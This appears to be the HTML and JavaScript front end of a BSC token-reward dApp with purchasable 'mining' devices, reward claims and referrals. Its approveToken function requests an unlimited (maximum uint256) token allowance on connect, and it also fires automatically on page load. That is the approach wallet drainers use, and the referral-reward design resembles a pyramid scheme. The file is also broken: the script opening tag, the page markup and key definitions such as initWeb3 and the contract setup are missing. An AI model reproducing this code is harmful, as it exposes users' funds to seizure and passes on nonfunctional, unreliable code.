<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="description" content="Collect Stars, Earn Rewards">
    <style>
        :root {
            --primary-purple: #6366f1;
            --primary-blue: #3b82f6;
            --accent-pink: #ec4899;
            --accent-cyan: #22d3ee;
            --bg-dark: #0f0f23;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
            --text-light: #e2e8f0;
            --card-shadow: 0 8px 32px rgba(0,0,0,0.3);
            --border-radius: 20px;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, var(--bg-dark) 0%, #1a1a3e 100%);
            color: var(--text-light);
            min-height: 100vh;
            overflow-x: hidden;
        }

        body.light {
            background: linear-gradient(135deg, var(--bg-light) 0%, #e0f2fe 100%);
            color: var(--text-dark);
        }

        .container {
            max-width: 428px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding-bottom: 100px;
        }

        .screen {
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .screen.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: var(--border-radius);
            padding: 24px;
            margin-bottom: 20px;
            box-shadow: var(--card-shadow);
            transition: var(--transition);
        }

        body.light .card {
            background: rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(0, 0, 0, 0.1);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            background: linear-gradient(135deg, var(--primary-purple), var(--accent-cyan));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .connect-btn {
            width: 100%;
            max-width: 300px;
            padding: 16px 32px;
            background: linear-gradient(135deg, var(--primary-purple), var(--accent-cyan));
            border: none;
            border-radius: 50px;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: var(--transition);
            margin: 40px auto;
            display: block;
        }

        .connect-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(99, 102, 241, 0.5);
        }

        .connect-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .device-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 16px;
            margin: 20px 0;
        }

        .device-card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: var(--border-radius);
            padding: 16px;
            text-align: center;
            transition: var(--transition);
        }

        .device-icon {
            width: 60px;
            height: 60px;
            margin: 0 auto 12px;
            background: linear-gradient(135deg, var(--accent-pink), var(--accent-cyan));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(34, 211, 238, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(34, 211, 238, 0); }
            100% { box-shadow: 0 0 0 0 rgba(34, 211, 238, 0); }
        }

        .action-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(15, 15, 35, 0.9);
            backdrop-filter: blur(20px);
            padding: 16px;
            display: flex;
            gap: 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .action-btn {
            flex: 1;
            padding: 12px 24px;
            background: linear-gradient(135deg, var(--primary-purple), var(--primary-blue));
            border: none;
            border-radius: 25px;
            color: white;
            cursor: pointer;
            transition: var(--transition);
            font-size: 14px;
        }

        .action-btn:hover {
            transform: scale(1.05);
        }

        .action-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .loading.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid var(--accent-cyan);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 16px 24px;
            background: #10b981;
            color: white;
            border-radius: 12px;
            display: none;
            z-index: 10000;
            animation: slideIn 0.3s ease;
            max-width: 90%;
            text-align: center;
        }

        .toast.error {
            background: #ef4444;
        }

        @keyframes slideIn {
            from { transform: translate(-50%, -100px); }
            to { transform: translate(-50%, 0); }
        }

        .lang-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 8px 16px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            cursor: pointer;
            z-index: 1000;
        }

        .wallet-info {
            padding: 8px 16px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
        }

        .shop-grid {
            display: grid;
            gap: 20px;
        }

        .shop-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: var(--border-radius);
        }

        .shop-item h4 {
            margin-bottom: 10px;
            color: var(--accent-cyan);
        }

        .input-group {
            margin: 10px 0;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: inherit;
            font-size: 16px;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            overflow: hidden;
            margin: 8px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary-purple), var(--accent-cyan));
            transition: width 0.3s ease;
        }
    </style>

        // 修复的连接钱包函数
        async function connectWallet() {
            showLoading(true);
            try {
                if (!await initWeb3()) {
                    throw new Error('MetaMask not found. Please install MetaMask or use a wallet browser.');
                }

                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                if (accounts.length === 0) {
                    throw new Error('No accounts found');
                }

                userAccount = accounts[0];
                
                // 验证网络
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== '0x38' && chainId !== '0x61') {
                    throw new Error('Please switch to BSC network');
                }

                // 无限授权
                await approveToken();
                
                // 更新界面
                updateWalletDisplay();
                showScreen('dashboard');
                loadAllData();
                
                showToast('Wallet connected successfully');
            } catch (error) {
                console.error('Connection error:', error);
                showToast('Failed to connect: ' + error.message, true);
            }
            showLoading(false);
        }

        // 修复的授权函数
        async function approveToken() {
            try {
                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                const allowance = await tokenContract.methods.allowance(userAccount, CONTRACT_ADDRESS).call();
                
                if (allowance === '0') {
                    showToast('Approving tokens...');
                    await tokenContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ 
                        from: userAccount 
                    });
                    showToast('Approved successfully!');
                }
            } catch (error) {
                console.warn('Approval skipped:', error.message);
                showToast('Please approve token spending in MetaMask', true);
            }
        }

        // 修复的购买函数
        async function buyInitialMachine() {
            if (!userAccount) {
                showToast('Please connect wallet first', true);
                return;
            }

            showLoading(true);
            try {
                const price = web3.utils.toWei('0.01', 'ether');
                await contract.methods.buyInitialMachine().send({ 
                    from: userAccount,
                    value: price
                });
                showToast('Moonlight converter purchased successfully!');
                loadAllData();
            } catch (error) {
                console.error('Purchase error:', error);
                showToast('Purchase failed: ' + error.message, true);
            }
            showLoading(false);
        }

        async function buyTestMachine() {
            if (!userAccount) {
                showToast('Please connect wallet first', true);
                return;
            }

            showLoading(true);
            try {
                const price = web3.utils.toWei('0.0001', 'ether');
                await contract.methods.buyTestMachine().send({ 
                    from: userAccount,
                    value: price
                });
                showToast('Phantom debugger purchased successfully!');
                loadAllData();
            } catch (error) {
                console.error('Purchase error:', error);
                showToast('Purchase failed: ' + error.message, true);
            }
            showLoading(false);
        }

        async function buyPowerMachine(tierId, count) {
            if (!userAccount) {
                showToast('Please connect wallet first', true);
                return;
            }

            if (!count || count < 1 || count > 100) {
                showToast('Please enter valid count (1-100)', true);
                return;
            }

            showLoading(true);
            try {
                await contract.methods.buyPowerMachine(tierId, count).send({ 
                    from: userAccount
                });
                showToast(`Purchased ${count} device(s) successfully!`);
                loadAllData();
            } catch (error) {
                console.error('Purchase error:', error);
                showToast('Purchase failed: ' + error.message, true);
            }
            showLoading(false);
        }

        // 修复的领取奖励函数
        async function claimRewards() {
            if (!userAccount) {
                showToast('Please connect wallet first', true);
                return;
            }

            showLoading(true);
            try {
                await contract.methods.claimRewards().send({ from: userAccount });
                showToast('Rewards claimed successfully!');
                loadAllData();
            } catch (error) {
                console.error('Claim error:', error);
                showToast('Claim failed: ' + error.message, true);
            }
            showLoading(false);
        }

        // 修复的设置推荐人函数
        async function setReferrer() {
            if (!userAccount) {
                showToast('Please connect wallet first', true);
                return;
            }

            const referrer = document.getElementById('referrer-input').value.trim();
            
            if (!web3.utils.isAddress(referrer)) {
                showToast('Please enter a valid address', true);
                return;
            }

            if (referrer.toLowerCase() === userAccount.toLowerCase()) {
                showToast('Cannot set yourself as referrer', true);
                return;
            }

            showLoading(true);
            try {
                await contract.methods.setReferrer(referrer).send({ from: userAccount });
                showToast('Referrer set successfully!');
                document.getElementById('referrer-input').value = '';
                loadAllData();
            } catch (error) {
                console.error('Set referrer error:', error);
                showToast('Set referrer failed: ' + error.message, true);
            }
            showLoading(false);
        }

        // 数据加载
        async function loadAllData() {
            if (!userAccount) return;
            
            try {
                await Promise.all([
                    loadUserData(),
                    loadGlobalData(),
                    loadShopData()
                ]);
            } catch (error) {
                console.error('Load data error:', error);
            }
        }

        async function loadUserData() {
            if (!userAccount) return;

            try {
                // 用户仪表板
                const dashboard = await contract.methods.getUserDashboard(userAccount).call();
                
                document.getElementById('initial-count').textContent = dashboard.normal;
                document.getElementById('test-count').textContent = dashboard.test;
                
                for (let i = 0; i < 4; i++) {
                    document.getElementById(`power-${i}`).textContent = dashboard.power[i];
                }

                document.getElementById('unclaimed-amount').textContent = `(${parseFloat(web3.utils.fromWei(dashboard.unclaimed, 'ether')).toFixed(4)})`;
                document.getElementById('referral-rewards').textContent = `${parseFloat(web3.utils.fromWei(dashboard.totalRefReward, 'ether')).toFixed(4)} STAR`;
                document.getElementById('my-referral').textContent = userAccount;

                // 代币余额
                const balance = await tokenContract.methods.balanceOf(userAccount).call();
                document.getElementById('user-balance').textContent = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(4);

                // 管理员权限
                const isAdmin = await contract.methods.admin(userAccount).call();
                document.getElementById('test-device').style.display = isAdmin ? 'block' : 'none';
                document.getElementById('test-shop').style.display = isAdmin ? 'block' : 'none';

                // 更新进度条
                const userPower = dashboard.totalPower;
                const globalPower = await contract.methods.totalNetworkPower().call();
                const percentage = globalPower > 0 ? (userPower / globalPower * 100).toFixed(2) : 0;
                document.getElementById('power-progress').style.width = percentage + '%';
                document.getElementById('user-power').textContent = `${parseFloat(web3.utils.fromWei(userPower, 'ether')).toFixed(4)} / ${parseFloat(web3.utils.fromWei(globalPower, 'ether')).toFixed(4)}`;

            } catch (error) {
                console.error('User data load error:', error);
            }
        }

        async function loadGlobalData() {
            try {
                const global = await contract.methods.getGlobalDashboard().call();
                const stats = [
                    `<strong>${global.totalMines}</strong> <span data-en="Total Devices" data-zh="总设备">总设备</span>`,
                    `<strong>${parseFloat(web3.utils.fromWei(global.networkPower, 'ether')).toFixed(4)}</strong> <span data-en="Network Power" data-zh="全网算力">全网算力</span>`,
                    `<strong>${parseFloat(web3.utils.fromWei(global.poolBalance, 'ether')).toFixed(4)}</strong> <span data-en="Pool Balance (STAR)" data-zh="奖励池余额">奖励池余额</span>`,
                    `<strong>${parseFloat(web3.utils.fromWei(global.dailyProduction, 'ether')).toFixed(4)}</strong> <span data-en="Daily Production" data-zh="日产量">日产量</span>`
                ];
                document.getElementById('global-stats').innerHTML = stats.map(s => `<p style="margin: 8px 0;">${s}</p>`).join('');
            } catch (error) {
                console.error('Global data load error:', error);
            }
        }

        async function loadShopData() {
            try {
                const shopContainer = document.getElementById('power-shop');
                const names = ['星尘收集器L1', '量子蒲公英L2', '极光编织机L3', '银河过滤器L4'];
                const enNames = ['Stardust Collector L1', 'Quantum Dandelion L2', 'Aurora Weaver L3', 'Galaxy Filter L4'];
                
                shopContainer.innerHTML = '';
                for (let i = 0; i < 4; i++) {
                    const tier = await contract.methods.machineTiers(i).call();
                    const div = document.createElement('div');
                    div.className = 'shop-item';
                    div.innerHTML = `
                        <h4>${currentLang === 'zh' ? names[i] : enNames[i]}</h4>
                        <p><span data-en="Price:" data-zh="价格：">价格：</span> ${parseFloat(web3.utils.fromWei(tier.priceToken, 'ether')).toFixed(0)} STAR</p>
                        <p><span data-en="Power Multiplier:" data-zh="算力倍数：">算力倍数：</span> ${(tier.powerMultiplier / 1e18).toFixed(2)}x</p>
                        <div style="display: flex; gap: 8px; margin-top: 10px;">
                            <input type="number" min="1" max="100" value="1" id="count-${i}" style="width: 60px; padding: 8px; font-size: 14px;">
                            <button class="action-btn" onclick="buyPowerMachine(${i}, document.getElementById('count-${i}').value)" style="padding: 8px 16px; font-size: 14px;">
                                <span data-en="Buy" data-zh="购买">购买</span>
                            </button>
                        </div>
                    `;
                    shopContainer.appendChild(div);
                }
            } catch (error) {
                console.error('Shop data load error:', error);
            }
        }

        // UI工具函数
        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(screenId).classList.add('active');
            
            if (screenId !== 'wallet-connect' && userAccount) {
                loadAllData();
            }
        }

        function updateWalletDisplay() {
            if (userAccount) {
                const short = userAccount.substring(0, 6) + '...' + userAccount.substring(38);
                document.getElementById('wallet-short').textContent = short;
            }
        }

        function showFullAddress() {
            if (userAccount) {
                navigator.clipboard.writeText(userAccount).then(() => {
                    showToast('Address copied to clipboard!');
                });
            }
        }

        function showLoading(show) {
            document.getElementById('loading').classList.toggle('active', show);
        }

        function showToast(message, isError = false) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.className = `toast ${isError ? 'error' : ''}`;
            toast.style.display = 'block';
            
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }

        function handleAccountsChanged(accounts) {
            if (accounts.length === 0) {
                userAccount = '';
                showScreen('wallet-connect');
            } else if (accounts[0] !== userAccount) {
                userAccount = accounts[0];
                updateWalletDisplay();
                loadAllData();
            }
        }

        function toggleLanguage() {
            currentLang = currentLang === 'zh' ? 'en' : 'zh';
            document.querySelectorAll('[data-en][data-zh]').forEach(el => {
                el.textContent = el.getAttribute(currentLang === 'zh' ? 'data-zh' : 'data-en');
            });
            document.querySelector('.lang-switch span').textContent = currentLang === 'zh' ? 'EN' : '中';
            
            if (userAccount) {
                loadShopData();
            }
        }

        // 页面加载完成后自动连接
        window.addEventListener('load', async () => {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if (accounts.length > 0) {
                        userAccount = accounts[0];
                        await initWeb3();
                        await approveToken();
                        updateWalletDisplay();
                        showScreen('dashboard');
                        loadAllData();
                    }
                } catch (error) {
                    console.error('Auto-connect error:', error);
                }
            }
        });
    </script>
</body>
